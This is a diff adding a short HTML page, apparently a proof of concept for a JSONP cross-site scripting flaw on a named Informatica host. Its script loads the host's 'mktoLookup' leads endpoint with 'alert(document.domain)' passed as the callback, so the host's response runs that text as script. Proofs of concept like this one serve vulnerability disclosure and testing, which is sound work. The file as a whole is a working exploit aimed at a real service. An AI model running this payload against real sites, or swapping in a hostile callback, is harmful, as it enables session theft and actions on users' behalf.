@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>PoC XSS - Informatica JSONP</title>
+  </head>
+  <body>
+    <h1>PoC JSONP XSS</h1>
+    <script>
+      var s = document.createElement("script");
+      s.src = "https://wwwmicrolb.informatica.com/mktoLookup/api/leads?callback=alert(document.domain)&munchkinId=id:189-ZHZ-794";
+      document.body.appendChild(s);
+    </script>
+  </body>
+</html>
